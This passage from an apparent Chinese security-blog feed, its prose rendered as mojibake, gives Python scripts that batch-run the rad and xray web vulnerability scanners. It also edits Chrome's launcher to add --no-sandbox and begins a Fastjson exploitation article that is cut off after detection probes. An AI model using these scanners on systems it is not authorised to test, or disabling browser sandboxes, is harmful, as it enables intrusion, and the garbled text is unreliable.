href="https://github.com/timwhitez/rad-xray">https://github.com/timwhitez/rad-xray</a></p><p>è¿è¡Œè„šæœ¬ä¼šå‘ç°å‡ºç°é”™è¯¯ï¼Œno chrome foundï¼Œå› ä¸º rad è¿è¡Œéœ€è¦ chrome æµè§ˆå™¨ï¼Œæ‰€ä»¥è¦å®‰è£…chromeæµè§ˆå™¨</p><p>é˜²è„šæœ¬ä¸¢å¤±-å°†åŸæ–‡è´´è¿‡æ¥äº†ï¼ˆå¦‚æœ‰ä¾µæƒè¯·é‚®ç®±è”ç³»æˆ‘åˆ é™¤ï¼‰ã€‚</p><h3 id="ç¤¾åŒºç‰ˆç”¨æˆ·"><a href="#ç¤¾åŒºç‰ˆç”¨æˆ·" class="headerlink" title="ç¤¾åŒºç‰ˆç”¨æˆ·"></a>ç¤¾åŒºç‰ˆç”¨æˆ·</h3><p>urlä¸€è¡Œä¸€ä¸ªæ”¾url.txtä¸­ï¼Œå’Œradæ”¾åŒæ–‡ä»¶å¤¹</p><p>xrayå¼€å¯ç›‘å¬ï¼Œ</p><p>./xray webscan â€“listen 127.0.0.1:7777 â€“html-output report__datetime__.html</p><p>è¿è¡Œpy</p><p>python3 rad+xray.py</p><p>æ³¨æ„ï¼šå•ä¸ªä»»åŠ¡ç»“æŸåä¼škillæ‰€æœ‰çš„chromeè¿›ç¨‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">data1</span>):</span></span><br><span class="line">target = data1</span><br><span class="line"><span class="built_in">print</span>(target + <span class="string">&quot; Start Crawling&quot;</span>)</span><br><span class="line">cmd = [<span class="string">&quot;./rad&quot;</span>,<span class="string">&quot;-t&quot;</span>,target,<span class="string">&quot;--auto-index&quot;</span>, <span class="string">&quot;--http-proxy&quot;</span>, <span class="string">&quot;127.0.0.1:7777&quot;</span>, <span class="string">&quot;--no-banner&quot;</span>]</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">output = subprocess.check_output(cmd, timeout=<span class="number">3600</span>)</span><br><span class="line"><span class="built_in">print</span>(output.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="comment">#print(e)</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">sysstr = platform.system()</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;url.txt&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> text <span class="keyword">in</span> file.readlines():</span><br><span class="line">data1=text.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">main(data1)</span><br><span class="line"><span class="built_in">print</span>(data1 + <span class="string">&quot; Finish&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">10</span>)</span><br><span class="line"><span class="comment">#æ¸…é™¤å¤šä½™æµè§ˆå™¨è¿›ç¨‹</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span>(sysstr ==<span class="string">&quot;Windows&quot;</span>):</span><br><span class="line">os.system(<span class="string">&quot;taskkill /f /IM chrome*&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span>(sysstr ==<span class="string">&quot;Linux&quot;</span>):</span><br><span class="line">os.system(<span class="string">&quot;ps aux | awk &#x27;/chrome/ &#123; print $2 &#125; &#x27; | xargs kill -9&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="é«˜çº§ç‰ˆç”¨æˆ·"><a href="#é«˜çº§ç‰ˆç”¨æˆ·" class="headerlink" title="é«˜çº§ç‰ˆç”¨æˆ·"></a>é«˜çº§ç‰ˆç”¨æˆ·</h3><p>urlä¸€è¡Œä¸€ä¸ªæ”¾url.txtä¸­</p><p>xray+rad.py å’Œ xray å’Œ rad æ”¾åŒä¸€æ–‡ä»¶å¤¹</p><p>è¿è¡Œpy:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 xray+rad.py</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">data1</span>):</span></span><br><span class="line">target = data1</span><br><span class="line">cmd = [<span class="string">&quot;./xray&quot;</span>,<span class="string">&quot;webscan&quot;</span>,<span class="string">&quot;--browser-crawler&quot;</span>,target,<span class="string">&quot;--html-output&quot;</span> ,<span class="string">&quot;report__datetime__.html&quot;</span>]</span><br><span class="line">rsp=subprocess.Popen(cmd)</span><br><span class="line">output, error = rsp.communicate()</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;url.txt&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> text <span class="keyword">in</span> file.readlines():</span><br><span class="line">data1=text.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">main(data1)</span><br></pre></td></tr></table></figure><h3 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h3><p>å®‰è£…  <a href="https://www.google.com/chrome/?platform=linux">Chrome</a></p><p>centos7 å®‰è£…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">wget https://dl.google.com/linux/direct/google-chrome-stable_current_x86_64.rpm</span><br><span class="line">yum install -y google-chrome-stable_current_x86_64.rpm</span><br><span class="line">yum install libpcap-devel -y</span><br><span class="line">cp /usr/lib64/libpcap.so /usr/lib64/libpcap.so.0.8</span><br><span class="line">yum update glib2 -y </span><br><span class="line"></span><br><span class="line"><span class="comment"># æµ‹è¯•å®‰è£…</span></span><br><span class="line">/opt/google/chrome/chrome --version</span><br><span class="line"></span><br><span class="line"><span class="comment">#å¸è½½Googleæµè§ˆå™¨</span></span><br><span class="line">yum autoremove -y google-chrome</span><br></pre></td></tr></table></figure><p>ubuntu å®‰è£…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb</span><br><span class="line">sudo apt install ./google-chrome-stable_current_amd64.deb</span><br></pre></td></tr></table></figure><p>å†æ¬¡è¿è¡Œxrayä½ ä¼šå‘ç°åˆå‡ºç°é”™è¯¯äº†ï¼Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[launcher] Failed to get the debug url: [0224/025251.434358:ERROR:zygote_host_impl_linux.cc(90)] Running as root without --no-sandbox is not supported. See https://crbug.com/638180.</span><br></pre></td></tr></table></figure><p>åŸå› æ˜¯chromeçš„æ²™ç®±é—®é¢˜ï¼Œä¸èƒ½ä»¥rootç”¨æˆ·è¿è¡Œã€‚</p><h3 id="è§£å†³æ–¹æ¡ˆ-1"><a href="#è§£å†³æ–¹æ¡ˆ-1" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h3><p>ä¿®æ”¹ /usr/bin/ ç›®å½•ä¸‹çš„ google-chrome é…ç½®æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/bin/google-chrome</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">æ‰¾åˆ°å¦‚ä¸‹</span></span><br><span class="line">exec -a &quot;$0&quot; &quot;$HERE/chrome&quot; &quot;$@&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">exec</span> -a <span class="string">&quot;<span class="variable">$0</span>&quot;</span> <span class="string">&quot;<span class="variable">$HERE</span>/chrome&quot;</span> <span class="string">&quot;<span class="variable">$@</span>&quot;</span> æ³¨é‡Šæ‰</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">æ·»åŠ </span></span><br><span class="line">exec -a &quot;$0&quot; &quot;$HERE/chrome&quot; &quot;$@&quot; --user-data-dir --no-sandbox</span><br></pre></td></tr></table></figure><p>é‡æ–°è¿è¡Œxrayè„šæœ¬å³å¯</p><h2 id="0x03-æ‰©å±•ï¼šè„šæœ¬åå°è¿è¡Œ"><a href="#0x03-æ‰©å±•ï¼šè„šæœ¬åå°è¿è¡Œ" class="headerlink" title="0x03 æ‰©å±•ï¼šè„šæœ¬åå°è¿è¡Œ"></a>0x03 æ‰©å±•ï¼šè„šæœ¬åå°è¿è¡Œ</h2><p>å¦‚æœä¸ä½¿ç”¨æ­¤å‘½ä»¤ï¼Œå¦‚æœæ–­å¼€ shell ç»ˆç«¯ï¼Œä»»åŠ¡ä¼šç»“æŸ</p><p>å…·ä½“çš„å¯ä»¥å‚è€ƒè¿™ä¸ª <a href="https://www.runoob.com/linux/linux-comm-nohup.html">nohup</a></p><h3 id="åå°è¿è¡Œæ–¹å¼ä¸€ï¼šnohup"><a href="#åå°è¿è¡Œæ–¹å¼ä¸€ï¼šnohup" class="headerlink" title="åå°è¿è¡Œæ–¹å¼ä¸€ï¼šnohup"></a>åå°è¿è¡Œæ–¹å¼ä¸€ï¼šnohup</h3><p>1.åå°è¿è¡Œ</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup <span class="keyword">python3</span> browerscan.<span class="keyword">py</span> &amp;</span><br></pre></td></tr></table></figure><p>2.æŸ¥çœ‹é¡¹ç›®ç”Ÿæˆçš„æ•°æ®</p><blockquote><p>åŠ¨æ€æ˜¾ç¤ºæ•°æ®è¿›ç¨‹</p></blockquote><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">tail</span> -f nohup.txt</span><br></pre></td></tr></table></figure><p>3.æŸ¥çœ‹åå°è¿è¡Œ</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ps</span> -aux | <span class="keyword">grep</span> <span class="keyword">python3</span></span><br></pre></td></tr></table></figure><p>4.æ€æ­»åå°</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ps</span> -aux | <span class="keyword">grep</span> <span class="keyword">python3</span> </span><br><span class="line">kill <span class="keyword">python3</span>çš„UID</span><br></pre></td></tr></table></figure><h3 id="åå°è¿è¡Œæ–¹å¼äºŒï¼šscreenï¼ˆæ¨èï¼‰"><a href="#åå°è¿è¡Œæ–¹å¼äºŒï¼šscreenï¼ˆæ¨èï¼‰" class="headerlink" title="åå°è¿è¡Œæ–¹å¼äºŒï¼šscreenï¼ˆæ¨èï¼‰"></a>åå°è¿è¡Œæ–¹å¼äºŒï¼šscreenï¼ˆæ¨èï¼‰</h3><p>ç³»ç»Ÿç®¡ç†å‘˜ç»å¸¸éœ€è¦SSH æˆ–è€…telent è¿œç¨‹ç™»å½•åˆ°Linux æœåŠ¡å™¨ï¼Œç»å¸¸è¿è¡Œä¸€äº›éœ€è¦å¾ˆé•¿æ—¶é—´æ‰èƒ½å®Œæˆçš„ä»»åŠ¡ï¼Œæ¯”å¦‚ç³»ç»Ÿå¤‡ä»½ã€ftp ä¼ è¾“ç­‰ç­‰ã€‚é€šå¸¸æƒ…å†µä¸‹æˆ‘ä»¬éƒ½æ˜¯ä¸ºæ¯ä¸€ä¸ªè¿™æ ·çš„ä»»åŠ¡å¼€ä¸€ä¸ªè¿œç¨‹ç»ˆç«¯çª—å£ï¼Œå› ä¸ºå®ƒä»¬æ‰§è¡Œçš„æ—¶é—´å¤ªé•¿äº†ã€‚å¿…é¡»ç­‰å¾…å®ƒä»¬æ‰§è¡Œå®Œæ¯•ï¼Œåœ¨æ­¤æœŸé—´ä¸èƒ½å…³æ‰çª—å£æˆ–è€…æ–­å¼€è¿æ¥ï¼Œå¦åˆ™è¿™ä¸ªä»»åŠ¡å°±ä¼šè¢«æ€æ‰ã€‚</p><p>å‚è€ƒé“¾æ¥ <a href="https://www.cnblogs.com/mchina/archive/2013/01/30/2880680.html">https://www.cnblogs.com/mchina/archive/2013/01/30/2880680.html</a></p><p>å®‰è£…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># centos ç±»å‹</span></span><br><span class="line">yum install screen -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ubuntu ç±»å‹</span></span><br><span class="line">sudo apt-get install screen -y</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºæ–¹å¼</span></span><br><span class="line">screen         <span class="comment"># ç›´æ¥è¿›å…¥ä¼šè¯</span></span><br><span class="line"></span><br><span class="line">screen -S <span class="built_in">test</span> <span class="comment"># åˆ›å»ºä¸€ä¸ªscreen åå­—ä¸º test</span></span><br><span class="line"></span><br><span class="line">screen vi test.txt <span class="comment"># ä¼šè¯åˆ†ç¦»ä¸æ¢å¤</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¦»å¼€ä¼šè¯è¿˜å¯ä»¥æ¢å¤</span></span><br><span class="line">ctrl+aï¼Œd</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…³é—­ä¼šè¯</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥è¯¢</span></span><br><span class="line">screen -ls  <span class="comment"># æ˜¾ç¤ºå·²åˆ›å»ºçš„screenç»ˆç«¯</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿æ¥</span></span><br><span class="line">screen -r 2276 <span class="comment"># è¿æ¥ screen_id ä¸º 2276 </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¸…é™¤ä¼šè¯</span></span><br><span class="line">screen -wipe  <span class="comment"># æ¸…é™¤ dead çŠ¶æ€</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¢å¤å‡ºç°é—®é¢˜</span></span><br><span class="line"><span class="comment"># æœ‰æ—¶åœ¨æ¢å¤screenæ—¶ä¼šå‡ºç°There is no screen to be resumed matching ****</span></span><br><span class="line">screen -d ****</span><br><span class="line"></span><br><span class="line"><span class="comment"># å½“å‡†å¤‡ä¸‹è½½çš„æ—¶å€™ä¼šå‡ºç°è¿™ä¸ª ï¼Œè§£å†³æ–¹æ¡ˆ æŒ‰äº”ä¸‹ Ctrl + X ,ç„¶åç¦»å¼€ä¼šè¯ Ctrl + aï¼Œd ï¼Œåœ¨æ‰§è¡Œsz test.txt</span></span><br><span class="line">[root@localhost ~]<span class="comment"># sz test.txt </span></span><br><span class="line">ï¿½*B00000000000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># screenæ¨¡å¼æ— æ³•ç¿»é¡µï¼Œé¼ æ ‡æ— æ³•æ»šåŠ¨é—®é¢˜</span></span><br><span class="line">å…ˆæŒ‰Ctrl+aé”®ï¼Œç„¶åé‡Šæ”¾ï¼Œç„¶åå†æŒ‰[é”®å³å¯è¿›å…¥ç¿»é¡µæ¨¡å¼ã€‚ä½¿ç”¨é¼ æ ‡å¯ä»¥æ»šåŠ¨</span><br><span class="line"></span><br><span class="line">åˆ‡å›ä¹‹å‰æ¨¡å¼</span><br><span class="line">Ctrl+c </span><br></pre></td></tr></table></figure><p>å¿«æ·é”®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Ctrl + aï¼Œd   <span class="comment">#æš‚ç¦»å½“å‰ä¼šè¯</span></span><br><span class="line">Ctrl + aï¼Œc   <span class="comment">#åœ¨å½“å‰screenä¼šè¯ä¸­åˆ›å»ºä¸€ä¸ªå­ä¼šè¯</span></span><br><span class="line">Ctrl + aï¼Œw   <span class="comment">#å­ä¼šè¯åˆ—è¡¨</span></span><br><span class="line">Ctrl + aï¼Œp   <span class="comment">#ä¸Šä¸€ä¸ªå­ä¼šè¯</span></span><br><span class="line">Ctrl + aï¼Œn   <span class="comment">#ä¸‹ä¸€ä¸ªå­ä¼šè¯</span></span><br><span class="line">Ctrl + aï¼Œ0-9 <span class="comment">#åœ¨ç¬¬0çª—å£è‡³ç¬¬9å­ä¼šè¯é—´åˆ‡æ¢</span></span><br></pre></td></tr></table></figure><p>æ‰€æœ‰å‘½ä»¤å‚æ•°</p><ul><li>ğŸ’š screenæ‰€æœ‰å‘½ä»¤å‚æ•°</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-A ã€€å°†æ‰€æœ‰çš„è§†çª—éƒ½è°ƒæ•´ä¸ºç›®å‰ç»ˆç«¯æœºçš„å¤§å°ã€‚</span><br><span class="line">-d &lt;ä½œä¸šåç§°&gt; ã€€å°†æŒ‡å®šçš„screenä½œä¸šç¦»çº¿ã€‚</span><br><span class="line">-h &lt;è¡Œæ•°&gt; ã€€æŒ‡å®šè§†çª—çš„ç¼“å†²åŒºè¡Œæ•°ã€‚</span><br><span class="line">-m ã€€å³ä½¿ç›®å‰å·²åœ¨ä½œä¸šä¸­çš„screenä½œä¸šï¼Œä»å¼ºåˆ¶å»ºç«‹æ–°çš„screenä½œä¸šã€‚</span><br><span class="line">-r &lt;ä½œä¸šåç§°&gt; ã€€æ¢å¤ç¦»çº¿çš„screenä½œä¸šã€‚</span><br><span class="line">-R ã€€å…ˆè¯•å›¾æ¢å¤ç¦»çº¿çš„ä½œä¸šã€‚è‹¥æ‰¾ä¸åˆ°ç¦»çº¿çš„ä½œä¸šï¼Œå³å»ºç«‹æ–°çš„screenä½œä¸šã€‚</span><br><span class="line">-s ã€€æŒ‡å®šå»ºç«‹æ–°è§†çª—æ—¶ï¼Œæ‰€è¦æ‰§è¡Œçš„shellã€‚</span><br><span class="line">-S &lt;ä½œä¸šåç§°&gt; ã€€æŒ‡å®šscreenä½œä¸šçš„åç§°ã€‚</span><br><span class="line">-v ã€€æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚</span><br><span class="line">-x ã€€æ¢å¤ä¹‹å‰ç¦»çº¿çš„screenä½œä¸šã€‚</span><br><span class="line">-lsæˆ–--list ã€€æ˜¾ç¤ºç›®å‰æ‰€æœ‰çš„screenä½œä¸šã€‚</span><br><span class="line">-wipe ã€€æ£€æŸ¥ç›®å‰æ‰€æœ‰çš„screenä½œä¸šï¼Œå¹¶åˆ é™¤å·²ç»æ— æ³•ä½¿ç”¨çš„screenä½œä¸šã€‚</span><br></pre></td></tr></table></figure><p>å‚è€ƒé“¾æ¥</p><p><a href="https://github.com/timwhitez/rad-xray">https://github.com/timwhitez/rad-xray</a></p><p><a href="https://blog.csdn.net/yelllowcong/article/details/80159963">https://blog.csdn.net/yelllowcong/article/details/80159963</a></p><p><a href="https://blog.csdn.net/weixin_42250835/article/details/119983347">https://blog.csdn.net/weixin_42250835/article/details/119983347</a></p>]]></content>
    
    
    <summary type="html">åœ¨å·¥ä½œä¸­æ‰¹é‡å¤„ç†é‡åˆ°çš„é—®é¢˜ï¼Œrad+xrayåœ¨Linuxä¸‹è¿è¡Œçš„è®°å½•</summary>
    
    
    
    <category term="è¸©å‘è®°å½•" scheme="https://fz1lin.com/categories/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="ç¯å¢ƒ" scheme="https://fz1lin.com/tags/%E7%8E%AF%E5%A2%83/"/>
    
    <category term="Linux" scheme="https://fz1lin.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Fastjsonæ¼æ´åˆ©ç”¨åˆé›†</title>
    <link href="https://fz1lin.com/2022/498480683/"/>
    <id>https://fz1lin.com/2022/498480683/</id>
    <published>2022-08-19T13:19:14.000Z</published>
    <updated>2022-08-20T02:37:03.163Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-Fastjson-æ¦‚è¿°"><a href="#0x01-Fastjson-æ¦‚è¿°" class="headerlink" title="0x01 Fastjson æ¦‚è¿°"></a>0x01 Fastjson æ¦‚è¿°</h1><h2 id="1-åº”ç”¨åœºæ™¯"><a href="#1-åº”ç”¨åœºæ™¯" class="headerlink" title="1.åº”ç”¨åœºæ™¯"></a>1.åº”ç”¨åœºæ™¯</h2><h3 id="æ¥å£è¿”å›æ•°æ®"><a href="#æ¥å£è¿”å›æ•°æ®" class="headerlink" title="æ¥å£è¿”å›æ•°æ®"></a>æ¥å£è¿”å›æ•°æ®</h3><ol><li>Ajaxå¼‚æ­¥è®¿é—®æ•°æ®</li><li>RPCè¿œç¨‹è°ƒç”¨</li><li>å‰åç«¯åˆ†ç¦»åç«¯è¿”å›çš„æ•°æ®</li><li>å¼€æ”¾API(ä¸€äº›å…¬å¸å¼€æ”¾æ¥å£çš„æ—¶å€™ï¼Œæˆ‘ä»¬ç‚¹å‡»è¯·æ±‚ï¼Œè¿”å›çš„æ•°æ®æ˜¯JSONæ ¼å¼çš„)</li><li>ä¼ä¸šé—´åˆä½œæ¥å£(æ•°æ®å¯¹æ¥çš„æ—¶å€™å®šä¹‰çš„ä¸€ç§è§„èŒƒï¼Œç¡®å®šå…¥å‚ï¼Œå‡ºå·®)</li></ol><h3 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h3><p>å°†å¯¹è±¡æ•°æ®è½¬æ¢ä¸ºJSONæ ¼å¼ï¼Œåˆ©ç”¨JSONæ¥å®ç°åºåˆ—åŒ–å­˜å‚¨åœ¨ç£ç›˜ä¸­ã€‚</p><h3 id="ç”ŸæˆToken"><a href="#ç”ŸæˆToken" class="headerlink" title="ç”ŸæˆToken"></a>ç”ŸæˆToken</h3><p>ä¹Ÿå°±æ˜¯ä½¿ç”¨jsonå°†ä¸€äº›æ•°æ®å°è£…èµ·æ¥å½“åšè®¿é—®ä¸€äº›åº”ç”¨çš„ä»¤ç‰Œã€‚</p><h3 id="ä½œä¸ºé…ç½®æ–‡ä»¶"><a href="#ä½œä¸ºé…ç½®æ–‡ä»¶" class="headerlink" title="ä½œä¸ºé…ç½®æ–‡ä»¶"></a>ä½œä¸ºé…ç½®æ–‡ä»¶</h3><p>egï¼š<code>npmçš„package.json</code>åŒ…ç®¡ç†é…ç½®æ–‡ä»¶</p><p>ä¸è¿‡ä¸€èˆ¬æƒ…å†µä¸‹ä½¿ç”¨jsonä½œä¸ºé…ç½®æ–‡ä»¶çš„æƒ…å†µå¾ˆå°‘ï¼Œå¹¶ä¸å»ºè®®ä½¿ç”¨ã€‚</p><p><a href="https://www.codeleading.com/article/82974738889/">https://www.codeleading.com/article/82974738889/</a></p><h2 id="2-é»‘ç›’æµ‹è¯•"><a href="#2-é»‘ç›’æµ‹è¯•" class="headerlink" title="2.é»‘ç›’æµ‹è¯•"></a>2.é»‘ç›’æµ‹è¯•</h2><p>Fastjsonæ˜¯é˜¿é‡Œå·´å·´å…¬å¸å¼€æºçš„ä¸€æ¬¾JSONè§£æåº“ï¼Œå¯ç”¨äºå°†Javaå¯¹è±¡è½¬æ¢ä¸ºå…¶JSONè¡¨ç¤ºå½¢å¼ï¼Œä¹Ÿå¯ä»¥ç”¨äºå°†JSONå­—ç¬¦ä¸²è½¬æ¢ä¸ºç­‰æ•ˆçš„Javaå¯¹è±¡ã€‚</p><p>å®ƒé‡‡ç”¨ä¸€ç§â€œå‡å®šæœ‰åºå¿«é€ŸåŒ¹é…â€çš„ç®—æ³•ï¼ŒæŠŠJSON Parseçš„æ€§èƒ½æå‡åˆ°æè‡´ï¼Œæ˜¯ç›®å‰Javaè¯­è¨€ä¸­æœ€å¿«çš„JSONåº“ã€‚Fastjsonæ¥å£ç®€å•æ˜“ç”¨ï¼Œå·²ç»è¢«å¹¿æ³›ä½¿ç”¨åœ¨ç¼“å­˜åºåˆ—åŒ–ã€åè®®äº¤äº’ã€Webè¾“å‡ºã€Androidå®¢æˆ·ç«¯ç­‰å¤šç§åº”ç”¨åœºæ™¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>ç›®æ ‡ç«™ç‚¹å¦‚æœæŠ¥é”™çš„è¯ä¸€èˆ¬ä½¿ç”¨ä¸é—­åˆ&#123;èŠ±æ‹¬å·æˆ–è€…å¤šæ·»åŠ <span class="string">&quot;åŒå¼•å·æ¥è¿›è¡Œæµ‹è¯•&quot;</span>  <span class="comment"># &#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>fastjsonä¸jacksonåŒºåˆ«ï¼Œå¦‚æœè¯·æ±‚åŒ…ä¸­çš„ json å¦‚ä¸‹:</span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;age&quot;</span>:<span class="number">21</span>&#125;</span><br><span class="line">è¿½åŠ ä¸€ä¸ªéšæœº key ,ä¿®æ”¹ json ä¸º</span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;age&quot;</span>:<span class="number">21</span>,<span class="string">&quot;agsbdkjada__ss_d&quot;</span>:<span class="number">123</span>&#125;</span><br><span class="line">è¿™é‡Œ fastjson æ˜¯ä¸ä¼šæŠ¥é”™çš„, Jackson å› ä¸ºå¼ºåˆ¶ key ä¸ javabean å±æ€§å¯¹é½,åªèƒ½ 